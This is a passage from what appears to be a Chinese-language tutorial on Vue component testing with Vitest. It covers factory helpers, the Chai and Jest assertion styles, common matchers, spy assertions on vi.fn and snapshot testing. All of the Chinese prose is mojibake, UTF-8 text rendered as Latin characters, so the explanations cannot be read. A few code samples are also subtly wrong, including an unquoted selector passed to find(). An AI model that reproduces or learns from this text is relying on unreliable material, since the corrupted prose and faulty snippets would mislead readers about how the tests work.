èªç‚ºæˆ‘å€‘æ‡‰è©²å…¼å®¹çš„æ–¹å¼å»çœ‹å¾…ä»–ï¼Œä¹Ÿå°±æ˜¯èªªä»–ä¸æ’æ–¥æˆ‘å€‘å»åšæŠ½è±¡é€™ä»¶äº‹æƒ…ï¼Œä½†æ˜¯é¦–å…ˆè¦åšçš„æ‡‰è©²æ˜¯å…ˆä¿æŒå–®ç´”ï¼Œç›´åˆ°æˆ‘å€‘çœ‹åˆ°è¶³å¤ å¤šå…±åŒçš„æ¡ˆä¾‹ä¾†åˆ†æèƒ½æŠ½å–å‡ºçš„éƒ¨åˆ†ï¼Œå¦‚æœä¸å¤ å¤šé‚£ç”šè‡³åŸå…ˆ inline çš„æ¸¬è©¦æ¡ˆä¾‹ç‰ˆæœ¬ä¹Ÿæ¯”éå¤šæŠ½è±¡çš„ç‰ˆæœ¬è¦å¥½å¾—å¤šã€‚\né¿å…éåº¦å·¢ç‹€æƒ…å¢ƒ\næœ€å¾Œï¼Œå…±ç”¨çš„éƒ¨åˆ†é™¤éçœŸçš„æœ‰å¿…è¦é€é setup \u0026amp; teardown å¯¦ä½œè™•ç†ï¼Œå¦å‰‡å…±ç”¨çš„éƒ¨åˆ†å¤§å¤šä¹Ÿå¯ä»¥é€éè«¸å¦‚å·¥å» æ¨¡å¼(factory pattern)çš„å½¢å¼ç”¢ç”Ÿã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 /* æ“·å–è‡ªæˆ‘æŸå€‹å°ˆæ¡ˆå…§çš„å…ƒä»¶æ¸¬è©¦ */ const factory = ( options = { createSpy: vi.fn, }, ) =\u0026gt; { const wrapper = mount(component, { global: { plugins: [createTestingPinia(options)], }, }) const store = useMainStore() return { wrapper, store } } æ‰€ä»¥å¾€å¾Œè‹¥æœ‰ä½¿ç”¨åˆ°é€™é¡ API æ™‚ä¸ä»¿å…ˆæ€è€ƒä¸€ä¸‹æˆ‘å€‘çœŸçš„éœ€è¦å—ï¼Œé‚„æ˜¯æœ‰æ›´åŠ å„ªé›…çš„æ–¹å¼èƒ½å¤ è§£æ±ºé‡è¤‡çš„å•é¡Œå‘¢ï¼Ÿ\næ–·è¨€èªæ³•èˆ‡ Matchers æ–·è¨€(Assertion)åœ¨ç¨‹å¼è¨­è¨ˆé ˜åŸŸä¸­ä¸»è¦æŒ‡çš„æ˜¯ã€Œé‡å°ä¸€å€‹çµæœæŒ‡å‡ºç‚ºçœŸ(true)æˆ–å‡(false)ã€çš„é‚è¼¯åˆ¤æ–·å¼ã€‚\nè€Œåœ¨æ¸¬è©¦ä¸­æ–·è¨€ä¸»è¦æŒ‡çš„éƒ¨åˆ†å¦‚å…ˆå‰æåˆ°çš„ 3A æ¨¡å¼ä¸­çš„(Assert)æ­¥é©Ÿï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 describe(\u0026#39;\u0026#39;, () =\u0026gt; { it(\u0026#39;\u0026#39;, () =\u0026gt; { // æº–å‚™ï¼šArrange const wrapper = mount(component, { props: { content: \u0026#39;Hello, Unit-test!\u0026#39; } }) // æ“ä½œï¼šAct wrapper.find(\u0026#39;[data-test=\u0026#34;button\u0026#34;]\u0026#39;).click() // æ–·è¨€ï¼šAssert expect(wrapper.find(\u0026#39;[data-test=\u0026#34;content\u0026#34;]\u0026#39;)).toBe(\u0026#39;Hello, Unit-test!\u0026#39;) }) }) å…¶ä¸­æ–·è¨€(Assert)éšæ®µä¸­åœ¨èªæ³•çš„éƒ¨åˆ†å‰‡æœƒä½¿ç”¨åˆ°æ‰€è¬‚çš„ã€ŒMatchersã€ï¼Œä»¥ä¸Šæ–¹ç¨‹å¼ç¢¼ç‚ºä¾‹çš„è©±å°±æœƒæ˜¯ expect() å¾Œæ–¹çš„ toBe() é€™å€‹èªæ³•ï¼Œè€Œä¸åŒçš„ã€ŒMatchersã€èƒ½æ¯”å°çš„æ±è¥¿ä¹Ÿä¸å¤ªä¸€æ¨£ï¼Œç­è§£ä»€éº¼æ™‚å€™è©²é¸ä»€éº¼ Matchers åŸºæœ¬ä¸Šå¯«æ–·è¨€çš„æ™‚å€™å°±èƒ½ä¿¡æ‰‹æ»ä¾†ã€‚\næ–·è¨€èªæ³• ä¾æ“šä¸åŒå·¥å…·æˆ–æ¡†æ¶æ‰€æä¾›çš„æ–·è¨€èªæ³•(Assertion)ï¼Œå°æ–¼ Matchers ä¾†èªªå°±æœƒæœ‰ä¸åŒçš„å¯«æ³•ï¼Œæ‰€ä»¥é¦–å…ˆæˆ‘å€‘è¦å…ˆä¾†ç°¡å–®èªè­˜ä¸€ä¸‹ä¸åŒå·¥å…·ä¹‹é–“çš„æ–·è¨€èªæ³•é¢¨æ ¼ä¸Šçš„å·®ç•°ï¼ŒæŒ‘é¸èƒ½æ¥å—çš„æ–·è¨€é¢¨æ ¼å¾Œå†ä¾†çœ‹è©²é¢¨æ ¼çš„ Matcher ç”¨æ³•ï¼Œè€Œé¢¨æ ¼çš„éƒ¨åˆ†ä»¥ä¸‹å°‡ä¾åºä»‹ç´¹ï¼š\nChai æ–·è¨€åº« Jest æ¡†æ¶ä¸­çš„æ–·è¨€èªæ³• Vitest ä¸­æ‰€èƒ½ç”¨çš„éƒ¨åˆ† Chai Assertion Chai.js æœ¬èº«æ˜¯ä¸€å€‹å°ˆæ³¨åœ¨æä¾›æ–·è¨€èªæ³•çš„å·¥å…·åº«ï¼Œå®ƒæä¾›äº†ä¸‰ç¨®å¯«æ³•ï¼š\nAssert(TDD style) 1 2 3 4 5 it(\u0026#39;Chai/Assert\u0026#39;, () =\u0026gt; { const x = \u0026#39;Orange tabby cat\u0026#39; const y = \u0026#39;fat\u0026#39; assert(x !== y, \u0026#39;Orange tabby cat is not fat\u0026#39;) }) Expect(BDD style) 1 2 3 it(\u0026#39;Chai/Expect\u0026#39;, () =\u0026gt; { expect([1, 2]).to.be.an(\u0026#39;array\u0026#39;).that.does.not.include(3) }) Should(BDD style)ï¼šé€éæ“´å……ç‰©ä»¶ prototype çµ¦äºˆ should å±¬æ€§çš„æ–¹å¼ä½¿æˆ‘å€‘å¯ä»¥ç›´æ¥éˆå¼åŠ å…¥ Matchers åœ¨å®šç¾©å¥½çš„è®Šæ•¸å¾Œã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // é¸æ“‡ä¸€ï¼šåœ¨æ–·è¨€å‰éœ€è¦å‘¼å« `chai.should` æ–¹æ³•ï¼Œ import chai from \u0026#39;chai\u0026#39; chai.should() // é¸æ“‡äºŒï¼šç›´æ¥å¼•å…¥ä¸‹æ–¹ import \u0026#39;chai/register-should\u0026#39; // åº•ä¸‹çš„æ¸¬è©¦æ¡ˆä¾‹å°±èƒ½ç›´æ¥éˆå¼åŠ ä¸Š Matchers it(\u0026#39;Chai/Assert\u0026#39;, () =\u0026gt; { const foo = \u0026#39;bar\u0026#39; const beverages = { tea: [\u0026#39;chai\u0026#39;, \u0026#39;matcha\u0026#39;, \u0026#39;oolong\u0026#39;] } foo.should.be.a(\u0026#39;string\u0026#39;) foo.should.equal(\u0026#39;bar\u0026#39;) foo.should.have.lengthOf(3) beverages.should.have.property(\u0026#39;tea\u0026#39;).with.lengthOf(3) }) Jest Assertion ä»¥ Jest æ¸¬è©¦æ¡†æ¶ä¸­æ‰€æä¾›çš„æ–·è¨€æ–¹æ³•å‰‡åªæœ‰ï¼š\nExpect(BDD style)ï¼š 1 2 3 it(\u0026#39;expect/ BDD style\u0026#39;, () =\u0026gt; { expect(1).toBe(1) }) éœ€ç‰¹åˆ¥æ³¨æ„çš„æ˜¯ Jest ä¸­çš„ expect èˆ‡ Chai çš„ expect æ‰€æä¾›çš„ Matchers æ˜¯ä¸ä¸€æ¨£çš„ã€‚\nVitest ä»¥ Vitest æ¸¬è©¦å·¥å…·ä¾†èªªï¼Œæ–·è¨€(Assertion)èªæ³•çš„éƒ¨åˆ†ä»–å…§å»ºäº† Chai æ–·è¨€åº«èˆ‡å…¼å®¹äº† Jest ä¸­çš„æ–·è¨€èªæ³•ï¼Œå› æ­¤ä¸»è¦å°±æ˜¯åœ¨ä»¥ä¸Šä»‹ç´¹çš„å››ç¨®å¯«æ³•ä¸­é¸æ“‡ä¸€ç¨®ä½¿ç”¨ï¼\nè€Œæ¥ä¸‹ä¾†ä¸»è¦è‘—é‡ä»‹ç´¹ Jest Assertion ä¸­çš„ expect èªæ³•çš„ Matchers è¦å¦‚ä½•ä½¿ç”¨ï¼\nVitest(Jest expect Matchers) è¦å­¸ç¿’é€™é¡ Matchers é™¤äº†æŠŠ API doc ç¿»ä¸€è¼ªä¹‹å¤–ï¼Œæœ€å¿«çš„æ–¹å¼ä¹‹ä¸€å°±æ˜¯é‡å°ä¸åŒçš„æ¸¬è©¦çµæœç›®æ¨™é¡å‹å»æ­¸ç´ï¼Œè€Œä¾ç…§ç¶“é©—å¸¸è¦‹ç¨®é¡æœ‰ï¼š\nå¸¸ç”¨ï¼štoBe, not ç´”å€¼æ¯”å°(Primitive)é¡å‹ï¼šString, Number, Boolean\u0026hellip;, etc. é™£åˆ—æ¯”å°èˆ‡æª¢æŸ¥ ç‰©ä»¶æ¯”å°èˆ‡æª¢æŸ¥ ç›£è½å‡½å¼ å¿«ç…§ Error ç”±æ–¼ Matchers ç¹å¤šï¼Œæ‰€ä»¥å¾å¸¸ç”¨è·Ÿæ¦‚å¿µå®¹æ˜“ææ··çš„å¹¾å€‹é–‹å§‹å…ˆä»‹ç´¹èµ·ï¼š\nå¸¸ç”¨ toBeï¼šå°è³‡æ–™é¡å‹ç‚ºç´”å€¼(Primitive Value)ä¾†èªªå°±æ˜¯æ¯”å°å€¼ç›¸ç­‰ 1 2 expect(1).toBe(1) // passed expect(\u0026#39;1\u0026#39;).toBe(1) // failed å°éç´”å€¼(Non-Primitive Value)ä¾†èªªå°±æ˜¯æ¯”è¨˜æ†¶é«”ä½ç½®(reference)æ˜¯å¦ç›¸ç­‰\n1 2 3 4 5 6 7 8 9 const obj = {} const obj2 = obj expect(obj).toBe(obj2) // passed expect({}).toBe({}) // failed // `not`ï¼šç”¨æ–¼åè½‰æ–·è¨€çš„é‚è¼¯ expect(1).toBe(1) // passed expect(1).not.toBe(1) // failed expect(1).not.toBe(2) // passed ç´”å€¼è³‡æ–™é¡å‹æ¯”å° toBeCloseToï¼šè™•ç†æµ®é»æ•¸é‹ç®—æ™‚ 1 2 expect(0.1 + 0.2).toBe(0.3) // failed ç¬¦é»æº¢å‡ºï¼Œçµæœæ‡‰è©²æœƒç‚º 0.30000000000000004 expect(0.1 + 0.2).toBeCloseTo(0.3) // passed toBeGreaterThanã€toBeGreaterThanOrEqualã€toBeLessThanã€toBeLessThanOrEqual 1 2 3 4 expect(5).toBeGreaterThan(1) // passed expect(5).toBeGreaterThanOrEqual(5) // passed expect(6).toBeLessThan(7) // passed expect(6).toBeLessThanOrEqual(6) // passed toBeDefinedã€toBeUndefined 1 2 3 4 var a = \u0026#39;\u0026#39; var b expect(a).toBeDefined() // passed expect(b).toBeUndefined() // passed toBeTruthyã€toBeFalsy 1 2 expect(1).toBeTruthy() // passed expect(0).toBeFalsy() // passed toBeNullã€toBeNaN 1 expect(null).toBeNull() // passed toMatchï¼šå­—ä¸²æˆ–æ­£å‰‡æ¯”å° 1 expect(\u0026#39;0912345678\u0026#39;).toMatch(/^09[0-9]{8}$/) // passed é™£åˆ—æ¯”å°èˆ‡æª¢æŸ¥ toContainï¼šé™£åˆ—æ˜¯å¦å«æœ‰ç›®æ¨™å€¼ 1 2 expect([\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;]).toContain(\u0026#39;1\u0026#39;) // passed expect([\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;]).toContain(\u0026#39;4\u0026#39;) // failed toContainEqualï¼š é™£åˆ—æ˜¯å¦å«æœ‰è©²å€¼(é¡å‹ç‚ºç´”å€¼æ™‚æª¢é©—æ˜¯å¦ç›¸ç­‰ï¼Œé¡å‹ç‚ºç‰©ä»¶æ™‚æª¢é©—çµæ§‹æ˜¯å¦å…¨ç­‰) 1 2 3 4 5 6 // passed expect([\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;]).toContainEqual(\u0026#39;1\u0026#39;) // passed expect([{ val: \u0026#39;1\u0026#39; }, { val: \u0026#39;2\u0026#39; }]).toContainEqual({ val: \u0026#39;1\u0026#39; }) // failed expect([{ val: \u0026#39;1\u0026#39;, something: \u0026#39;other\u0026#39; }]).toContainEqual({ val: \u0026#39;1\u0026#39; }) toHaveLengthï¼šç¢ºèªå…¶å±¬æ€§çš„é•·åº¦æ˜¯å¦ç›¸ç­‰ 1 2 3 expect(\u0026#39;12\u0026#39;).toHaveLength(2) // passed expect([1, 2]).toHaveLength(2) // passed expect({ length: 2 }).toHaveLength(2) // passed ç‰©ä»¶æ¯”å°èˆ‡æª¢æŸ¥ toEqualï¼šæ¯”å°ç‰©ä»¶çµæ§‹æ˜¯å¦ç›¸åŒï¼Œè€Œéæ¯”å°åƒç…§ä¾†æº(reference)ï¼Œè€Œçµæ§‹ä¸­è‹¥å€¼ç‚º undefined æœƒå¿½ç•¥ 1 2 3 const A = { num: 100 } const B = { num: 100, secret: undefined } expect(A).toEqual(B) // passed toStrictEqualï¼šèˆ‡ toEqual é¡ä¼¼ï¼Œä½† undefined ä¸æœƒè¢«å¿½ç•¥ 1 2 3 4 5 const A = { num: 100 } const B = { num: 100 } const C = { num: 100, secret: undefined } expect(A).toStrictEqual(B) // passed expect(A).toStrictEqual(C) // failed ç”šè‡³ Class æ‰€å‰µé€ çš„ç‰©ä»¶èˆ‡ç‰©ä»¶å¯¦å­—(Object Literals)ç›¸æ¯”ä¹Ÿè¦–ç‚ºä¸åŒã€‚\n1 2 3 4 5 6 7 class MockClass { constructor(num) { this.num = num } } expect({num: 1}).toStrictEqual({num: 1}) // passed expect(new MockClass(1)).toStrictEqual({num: 1}) // failed toHavePropertyï¼šæª¢æŸ¥ç‰©ä»¶å«æœ‰å±¬æ€§èˆ‡å…¶å±¬æ€§å€¼ 1 2 3 4 5 const obj = { num: 100 } expect(obj).toHaveProperty(\u0026#39;num\u0026#39;) // passed expect(obj).toHaveProperty(\u0026#39;num\u0026#39;, 100) // passed expect(obj).toHaveProperty(\u0026#39;num\u0026#39;, 200) // failed toMatchObjectï¼š æª¢æŸ¥ç‰©ä»¶çš„å­å±¤ 1 2 3 4 5 6 const obj = { nested: { num: 200 }, num: 100 } expect(obj).toMatchObject({ num: 100 }) // passed expect(obj).toMatchObject({ num: 200 }) // failed expect(obj).toMatchObject({ nested: { num: 100 } }) // failed expect(obj).toMatchObject({ nested: { num: 200 } }) // passed ç¹¼çºŒè¬›è§£ä¸‹åˆ—å¹¾å€‹æ¯”è¼ƒç‰¹åˆ¥çš„ Matcher\nç›£è½å‡½å¼ åœ¨æ¸¬è©¦çš„éç¨‹ä¸­ï¼Œæœ‰æ™‚å€™æˆ‘å€‘ä¸åƒ…åªæ˜¯æ–·è¨€å—æ¸¬ç‰©(SUT, System Under Test)çš„ç‹€æ…‹ï¼Œæœ‰æ™‚å€™å¯èƒ½æœƒå°å—æ¸¬ç›®æ¨™çš„ã€Œä¾è³´ç‰©ã€(DOC, Depended-on Component)ç‹€æ…‹æœ‰èˆˆè¶£ï¼Œè€Œé€™æ™‚æˆ‘å€‘å°±ç„¡æ³•å–®ç´”ä»¥ Matchers ä¾†æ–·è¨€ï¼Œå› ç‚ºæˆ‘å€‘éœ€è¦ç›£è½ä¾è³´ç‰©å‰å¾Œçš„è®ŠåŒ–ã€‚\nè€Œåœ¨ç¨‹å¼æ¸¬è©¦é ˜åŸŸä¸­ï¼Œæ¸¬è©¦æ›¿èº«(test double)ä¸»è¦å°±æ˜¯è² è²¬è™•ç†é€™ä¸€é¡éå—æ¸¬ç‰©æœ¬èº«æ‰€åšçš„äº‹æƒ…ï¼Œä¸¦ä¸”åœ¨éœ€è¦æ™‚é‚„èƒ½å¹«æˆ‘å€‘ç´€éŒ„å¿…è¦çš„è³‡è¨Šã€‚\nå‡è‹¥æˆ‘å€‘ä»Šå¤©æ¸¬è©¦æ¡ˆä¾‹å—æ¸¬ç‰©æœ¬èº«æœƒå»å‘¼å«åˆ°çš„ä¾è³´ç›®æ¨™æ˜¯å€‹ã€Œå‡½å¼ã€æ™‚ï¼Œé€™æ™‚æˆ‘å€‘å¯ä»¥é€é Vitest æ‰€æä¾›çš„ vi.fn() ä¾†æ¨¡ä»¿(spy)å‡½å¼ã€‚\nvi.fn() æœ¬èº«æœƒå›å‚³ä¸€å€‹å¯¦é«”(CallableMockInstance)ï¼Œåœ¨é€™å€‹å¯¦é«”ä¸­æœƒè¨˜éŒ„è‘—æœ‰é—œæ¸¬è©¦å‡½å¼æ™‚æœƒéœ€è¦çš„è³‡æ–™èˆ‡æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 console.log(vi.fn()) /* called: false, callCount: 0, results: [], calls: [], impl: [Function (anonymous)], reset: [Function: i], nextError: [Function (anonymous)], nextResult: [Function (anonymous)], restore: [Function: w], ... */ å› æ­¤å°‡å—æ¸¬çš„ç›®æ¨™å‡½å¼æ”¾å…¥ vi.fn ä¸­ï¼Œå¾ŒçºŒåªè¦æ¸¬è©¦éç¨‹ä¸­å¦‚æœæ¸¬è©¦ç›®æ¨™å»èª¿ç”¨äº†å·²è¢« Spy éçš„å‡½å¼æ™‚ï¼ŒCallableMockInstance å°±æœƒå¹«æˆ‘å€‘ç´€éŒ„ç›¸é—œçš„è³‡è¨Šï¼Œæ¥è‘—æˆ‘å€‘å°±å¯ä»¥ä½¿ç”¨æ–·è¨€èªæ³•ç›¸é—œçš„ Matcher å»æ¯”å°æˆ‘å€‘é æœŸçš„çµæœï¼Œæ¯”æ–¹èªªï¼š\ntoHaveBeenCalledï¼šæ–·è¨€å‡½å¼æœ‰è¢«å‘¼å«é 1 2 3 4 5 const sayHi = (something) =\u0026gt; something const spyOnSayHi = vi.fn(sayHi) spyOnSayHi() expect(spyOnSayHi).toHaveBeenCalled() toHaveBeenCalledTimesï¼šæ–·è¨€å‡½å¼è¢«å‘¼å«éå¹¾æ¬¡ 1 2 3 4 5 6 7 8 const sayHi = (something) =\u0026gt; something const spyOnSayHi = vi.fn(sayHi) spyOnSayHi() spyOnSayHi() spyOnSayHi() expect(spyOnSayHi).toHaveBeenCalledTimes(3) toHaveBeenCalledWithï¼šæ–·è¨€å‡½å¼è¢«å‘¼å«æ™‚æ‰€å¸¶çš„åƒæ•¸ 1 2 3 4 5 6 const sayHi = (something) =\u0026gt; something const spyOnSayHi = vi.fn(sayHi) spyOnSayHi(\u0026#39;Hello, Unit-Test!\u0026#39;) expect(spyOnSayHi).toHaveBeenCalledWith(\u0026#39;Hello, Unit-Test!\u0026#39;) toHaveReturnedï¼šæ–·è¨€å‡½å¼å‘¼å«å¾Œæ‡‰è©²è‡³å°‘è¦è¿”å›å€¼ä¸€æ¬¡ 1 2 3 4 5 6 const sayHi = (something) =\u0026gt; something + \u0026#39; Hello, Spy!\u0026#39; const spyOnSayHi = vi.fn((val) =\u0026gt; sayHi(val)) spyOnSayHi(\u0026#39;Hello, Unit-Test!\u0026#39;) expect(spyOnSayHi).toHaveReturned() toHaveReturnedTimesï¼šæ–·è¨€å‡½å¼ç¶“éæ“ä½œå¾Œæ‡‰è©²è¦è¿”å›å€¼å¹¾æ¬¡ 1 2 3 4 5 6 7 const sayHi = (something) =\u0026gt; something const spyOnSayHi = vi.fn((val) =\u0026gt; sayHi(val)) spyOnSayHi(\u0026#39;Nice to meet you!\u0026#39;) spyOnSayHi(\u0026#39;See you again!\u0026#39;) expect(spyOnSayHi).toHaveReturnedTimes(2) toHaveLastReturnedWithï¼šæ–·è¨€å‡½å¼ç¶“éæ“ä½œå¾Œæœ€å¾Œæ‡‰è©²è¦è¿”å›çš„å€¼ 1 2 3 4 5 6 7 const sayHi = (something) =\u0026gt; something const spyOnSayHi = vi.fn((val) =\u0026gt; sayHi(val)) spyOnSayHi(\u0026#39;Nice to meet you!\u0026#39;) spyOnSayHi(\u0026#39;See you again!\u0026#39;) expect(spyOnSayHi).toHaveLastReturnedWith(\u0026#39;See you again!\u0026#39;) toHaveNthReturnedWithï¼šæ–·è¨€å‡½å¼ç¶“éæ“ä½œå¾Œç¬¬ N æ¬¡æ‡‰è©²è¦è¿”å›çš„å€¼ 1 2 3 4 5 6 7 const sayHi = (something) =\u0026gt; something const spyOnSayHi = vi.fn((val) =\u0026gt; sayHi(val)) spyOnSayHi(\u0026#39;Nice to meet you!\u0026#39;) spyOnSayHi(\u0026#39;See you again!\u0026#39;) expect(spyOnSayHi).toHaveNthReturnedWith(1, \u0026#39;Nice to meet you!\u0026#39;) toHaveReturnedWithï¼šæ–·è¨€å‡½å¼å‘¼å«å¾Œè¿”å›çš„å€¼ 1 2 3 4 5 6 const sayHi = (something) =\u0026gt; something + \u0026#39; Hello, Spy!\u0026#39; const spyOnSayHi = vi.fn((val) =\u0026gt; sayHi(val)) spyOnSayHi(\u0026#39;Hello, Unit-Test!\u0026#39;) expect(spyOnSayHi).toHaveReturnedWith(\u0026#39;Hello, Unit-Test! Hello, Spy!\u0026#39;) è€Œæ¸¬è©¦æ›¿èº«(test double)é™¤äº†åƒæ˜¯ vi.fn() é€™é¡é–“è«œé¡å‹(Spy)ä¹‹å¤–ï¼Œé‚„æœ‰è¨±å¤šä¸åŒçš„æ¸¬è©¦æ›¿èº«ï¼Œå®ƒå€‘åœ¨æ¸¬è©¦ä¸­éƒ½æœ‰å„è‡ªçš„ç”¨é€”ä¾†å”åŠ©æˆ‘å€‘æ›´å¥½çš„æ¸¬è©¦ã€‚\nå¿«ç…§æ¸¬è©¦(Snapshot Testing)èˆ‡å¿«ç…§ matchers Jest Snapshot åœ¨ Jest çš„ Snapshot Testing èªªæ˜æ–‡ä»¶çš„å®šç¾©ä¸­ä¸»è¦æŒ‡çš„æ˜¯ç”¨ä¾†é˜²æ­¢ UI å‡ºç¾å°šæœªé æœŸçš„è®ŠåŒ–ï¼š\n1 2 3 \u0026lt;template\u0026gt; \u0026lt;a data-test=\u0026#34;link\u0026#34; href=\u0026#34;http://ithelp.ithome.com.tw\u0026#34;\u0026gt; Ithelp \u0026lt;/a\u0026gt; \u0026lt;/template\u0026gt; 1 2 3 4 5 import { mount } from \u0026#39;@vue/test-utils\u0026#39; it(\u0026#39;æ¸²æŸ“é€£çµ\u0026#39;, () =\u0026gt; { const wrapper = mount(component) expect(wrapper.find([data-test=\u0026#34;link\u0026#34;])).toMatchSnapshot(); }); ç„¶è€Œé€™é‚Šçš„è®ŠåŒ–ï¼Œä¸¦éä½ æ‰€æƒ³åƒçš„æŠŠè¦–è¦ºç•«é¢çµ¦ç…§ç›¸ä¸‹ä¾†æ¯”å°åƒç´ æˆ–æ¯”ä¾‹çš„é‚£ç¨®è¦–è¦ºå›æ­¸æ¸¬è©¦(Visual Regression Testing)ï¼Œè€Œæ˜¯è—‰ç”±å°‡ç›®æ¨™å…ƒä»¶é€éæ¸²æŸ“(Render)å…ƒä»¶ç”¢ç”Ÿäº†ä¸€å€‹ DOM çµæ§‹çš„æ–‡å­—ï¼Œä¸¦åœ¨æ¸¬è©¦ç¨‹å¼æª”è·¯å¾‘åº•ä¸‹çš„ __snapshots__ è³‡æ–™å¤¾ç”Ÿæˆä¸€å€‹ .snap æª”æ¡ˆä¾†åšç´€éŒ„ï¼š\n1 2 3 4 5 6 7 8 exports[`æ¸²æŸ“é€£çµ`] = ` \u0026lt;a data-test=\u0026#34;link\u0026#34; href=\u0026#34;http://ithelp.ithome.com.tw\u0026#34; \u0026gt; Ithelp \u0026lt;/a\u0026gt; `; æˆªè‡³ Jest Snapshot é é¢ä¸­çš„ç¨‹å¼ç¢¼\nåœ¨ç¬¬äºŒæ¬¡åŸ·è¡Œæ¸¬è©¦çš„æ™‚å€™ï¼Œå°±æœƒå†æ¬¡åšä¸€æ¬¡åŒæ¨£çš„æµç¨‹ï¼Œè€Œé€™æ¬¡æ‰€ç”¢ç”Ÿçš„çµæœæœƒèˆ‡å…ˆå‰çš„ .snap ç´€éŒ„åšæ¯”å°ã€‚\nå‡è¨­æ¯”å°ä¸Šæœ‰è½å·®å°±æœƒæ‹‹å‡ºéŒ¯èª¤ï¼š\n1 2 3 4 5 6 7 8 - Snapshot - 1 + Received + 1 \u0026lt;a - href=\u0026#34;http://ithelp.ithome.com.tw\u0026#34; + href=\u0026#34;https://ithelp.ithome.com.tw\u0026#34; \u0026gt; Ithelp \u0026lt;/a\u0026gt; è—‰ç”±é€™å€‹æ¯”å°æ©Ÿåˆ¶å¾è€Œå¯¦ç¾ã€Œé˜²æ­¢ UI å‡ºç¾å°šæœªé æœŸçš„è®ŠåŒ–ã€çš„åŠŸèƒ½ã€‚\nVitest Snapshot è€Œå‰é¢æœ‰æåˆ° Vitest æœ¬èº«å…¼å®¹äº† Jest çš„æ–·è¨€(assertion)èªæ³•ï¼Œæ‰€ä»¥å¿«ç…§(Snapshot)çš„ matcher è‡ªç„¶ä¹Ÿæ˜¯ä¸èƒ½æ”¾éã€‚\nåœ¨ Vitest ä¸­ä¸»è¦å…¼å®¹çš„ matcher éƒ¨åˆ†æœ‰ï¼š\ntoMatchSnapshot toMatchInlineSnapshot åŸºæœ¬ä¸Šæ¦‚å¿µèˆ‡ Jest Snapshot ç›¸ä¼¼ï¼Œéƒ½æ˜¯åœ¨åšçµæ§‹å¿«ç…§é€™ä»¶äº‹æƒ…ï¼Œç„¶è€Œ Vitest æ–‡ä»¶éƒ¨åˆ†å‰‡æ˜¯æ²’æœ‰ç‰¹åœ°å¼·èª¿ UI çš„éƒ¨åˆ†ï¼Œè€Œæ˜¯é—œæ³¨åœ¨å€¼(value)çš„æ¯”å°ã€‚\nå› æ­¤æˆ‘å€‘å–®ç´”æ”¾å…¥ä¸€å€‹é™£åˆ—ç‰©ä»¶\n1 2 3 4 5 6 7 8 9 10 11 12 13 it(\u0026#39;cat snapshot\u0026#39;, () =\u0026gt; { const target = [ { name: \u0026#39;Orange\u0026#39;, age: 4, }, { name: \u0026#39;Blank\u0026#39;, age: 6, }, ] expect(target).toMatchSnapshot() }) .snap çš„çµæœï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 exports[`component \u0026gt; cat snapshot 1`] = ` [ { \u0026#34;age\u0026#34;: 4, \u0026#34;name\u0026#34;: \u0026#34;Orange\u0026#34;, }, { \u0026#34;age\u0026#34;: 6, \u0026#34;name\u0026#34;: \u0026#34;Blank\u0026#34;, }, ] `; ç”šè‡³ä¹Ÿå¯ä»¥å¼•å…¥ JSON æª”æ¡ˆä¾†åšå¿«ç…§ï¼š\n1 2 3 4 5 import Area from \u0026#39;./area.json\u0026#39; it(\u0026#39;static json snapshot\u0026#39;, () =\u0026gt; { expect(Area).toMatchSnapshot() }) ç•¶ç„¶å…ƒä»¶å¿«ç…§ä¹Ÿæ˜¯èƒ½åšçš„ï¼š\n1 2 3 4 5 6 7 import { mount } from \u0026#39;@vue/test-utils\u0026#39; it(\u0026#39;snapshot\u0026#39;, () =\u0026gt; { const wrapper = mount(component) const target = wrapper.find(\u0026#39;[data-test=\u0026#34;content\u0026#34;]\u0026#39;) expect(target).toMatchSnapshot() }) è€Œä»¥ä¸Šå¿«ç…§éƒ¨åˆ†å¦‚æœä½ è¦ºå¾—è¦ç”Ÿæˆä¸€å€‹æª”æ¡ˆä¾†ç®¡ç†æœ‰é»å›‰å”†ï¼Œé‚£éº¼ä½ å¯ä»¥é€é toMatchInlineSnapshot ä¾†è™•ç†é€™é¡çš„éœ€æ±‚ï¼Œå…¶å·®åˆ¥åœ¨æ–¼ç”Ÿæˆçš„ä½ç½®æœƒæ˜¯åœ¨ toMatchInlineSnapshot() å‡½å¼æœ¬èº«è£¡é¢ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 it(\u0026#39;cat snapshot\u0026#39;, () =\u0026gt; { const target = [ { name: \u0026#39;Orange\u0026#39;, age: 4, }, { name: \u0026#39;Blank\u0026#39;, age: 6, }, ] // åŸå…ˆ toMatchInlineSnapshot å…§æ²’æœ‰ä»»ä½•æ±è¥¿ // åœ¨åŸ·è¡Œæ¸¬è©¦å¾Œå°±æœƒå°‡å¿«ç…§å…§å®¹è‡ªå‹•ç”Ÿæˆåœ¨ toMatchInlineSnapshot è£¡ expect(target).toMatchInlineSnapshot(` [ { \u0026#34;age\u0026#34;: 4, \u0026#34;name\u0026#34;: \u0026#34;Orange\u0026#34;, }, { \u0026#34;age\u0026#34;: 6, \u0026#34;name\u0026#34;: \u0026#34;Blank\u0026#34;, }, ] `) }) æœ€å¾Œï¼Œå¦‚æœé‡åˆ°è®Šæ›´çš„éƒ¨åˆ†æ˜¯æˆ‘å€‘æ‰€é æœŸçš„æ™‚å€™ï¼Œæ­¤æ™‚å°±éœ€è¦æ›´æ–°å¿«ç…§çš„éƒ¨åˆ†ï¼Œå¯ä»¥åœ¨åŸ·è¡Œæ¸¬è©¦çš„ watch æ¨¡å¼æ™‚æŒ‰ä¸‹ u éµï¼Œå°±å°‡æ–°çš„å¿«ç…§ä¿å­˜èµ·ä¾†ï¼Œæˆ–æ˜¯é€éæ–°å¢ npm scripts æŒ‡ä»¤ä¾†åŸ·è¡Œå‘½ä»¤ï¼š\n1 2 3 4 5 { \u0026#34;scripts\u0026#34;: { \u0026#34;test:update\u0026#34;: \u0026#34;vitest -u\u0026#34;, }, } Error æœ€å¾Œä»‹ç´¹åˆ°çš„å‰‡æ˜¯éŒ¯èª¤é¡å‹çš„ Matcherï¼š\ntoThrowError toThrowErrorMatchingSnapshot 